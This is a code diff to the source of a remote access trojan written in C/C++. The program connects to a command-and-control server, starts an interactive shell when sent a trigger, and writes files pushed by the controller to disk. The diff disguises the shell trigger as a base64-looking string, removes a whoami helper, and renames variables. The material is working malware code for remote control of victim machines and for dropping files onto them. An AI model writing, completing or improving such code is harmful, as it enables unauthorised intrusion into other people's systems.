@@ -62,7 +62,6 @@ char* itoa(int value, char* str, int radix) {
 
 
 /*======== RAT FUNCTIONS ========*/
-
 int upload(char *filename, char *content){
 	errno = 0;
 	FILE *outfile;
@@ -75,13 +74,6 @@ int upload(char *filename, char *content){
 		fclose(outfile);
 		return 0;
 	}
-}
-
-void whoami(char *returnval, int returnsize)
-{
-    int bufferlen = 257;
-    struct passwd *p = getpwuid(getuid());  // Check for NULL!
-    sprintf(returnval, p->pw_name);
 }
 
 void RAT(char* C2_Server, int C2_Port)
@@ -135,7 +127,7 @@ void RAT(char* C2_Server, int C2_Port)
                 }
 
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(command, "shell") == 0))
+                if ((strcmp(command, "aSB3YW50IHNoZWxsIG5vdw") == 0))
                 {
 
                     int dup_orig_stdin  = dup(0);
@@ -283,9 +275,9 @@ void RAT(char* C2_Server, int C2_Port)
                     
                     send(tcp_sock, buffer, strlen(buffer)+1,0); // send response
                     
-                    int result = recv(tcp_sock, base64file, data_length_int, 0);
+                    int recv_result = recv(tcp_sock, base64file, data_length_int, 0);
 
-                    if (result <= 0)
+                    if (recv_result <= 0)
                     {
                         close(tcp_sock);
                         std::cout << "Error received during upload procedure. Socket killed. Sleep Start" << std::endl;
@@ -295,12 +287,12 @@ void RAT(char* C2_Server, int C2_Port)
                     }
 
                     // uploading
-                    int result;
-                    result = upload(filename,base64file);
+                    int file_result;
+                    file_result = upload(filename,base64file);
                     
                     // C&C part
                     memset(buffer, 0, sizeof(buffer));
-                    if (result == 0) {
+                    if (file_result == 0) {
                         strcat(buffer,"\n[+] Uploaded: "); 
                         strcat(buffer,filename); 
                     }
@@ -310,12 +302,14 @@ void RAT(char* C2_Server, int C2_Port)
                         // parse errno
                         char errnos[2];
                         memset(errnos,0,2);
-                        itoa(result,errnos,10);
+                        itoa(file_result,errnos,10);
                         strcat(buffer,errnos);
                     }
                     strcat(buffer,"\n");
                     
+                    // Send result info
                     send(tcp_sock,buffer,strlen(buffer)+1,0);
+
                     // clear buffers
                     memset(base64file, 0, sizeof(base64file));
                     memset(buffer, 0, sizeof(buffer));
